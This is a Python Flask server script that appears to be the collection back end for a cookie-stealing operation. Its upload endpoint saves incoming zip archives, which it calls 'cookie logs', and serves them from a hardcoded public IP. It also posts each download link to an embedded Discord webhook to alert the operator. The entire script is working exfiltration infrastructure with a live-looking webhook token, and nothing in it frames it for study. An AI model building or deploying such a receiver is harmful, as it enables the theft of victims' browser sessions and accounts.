from flask import Flask, request, send_from_directory, abort
import os
import time
import random
import string
import requests

app = Flask(__name__)

UPLOAD_FOLDER = 'logs'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1519309337003167957/yE8dTGT6DrhEMgqjkV9bXMPUYNNKb72ZBdTnlolj9vrvHk2GvHUKr5HfJKxg-utmYAme'
PUBLIC_BASE_URL = 'http://172.245.61.210:6000'

@app.route('/upload', methods=['POST'])
def upload_file():
    if not request.data:
        return 'No file data', 400

    # Generate a random filename
    random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    filename = f'{int(time.time())}_{random_str}.zip'
    filepath = os.path.join(UPLOAD_FOLDER, filename)

    with open(filepath, 'wb') as f:
        f.write(request.data)

    download_url = f'{PUBLIC_BASE_URL}/files/{filename}'

    # Notify Discord
    message = {'content': f'New cookie log uploaded: {download_url}'}
    try:
        requests.post(DISCORD_WEBHOOK, json=message, timeout=5)
    except Exception as e:
        print(f'Webhook error: {e}')

    return f'Uploaded: {download_url}\n', 200

@app.route('/files/<path:filename>')
def download_file(filename):
    if not filename.endswith('.zip') or '..' in filename:
        abort(404)
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=6000, debug=False)
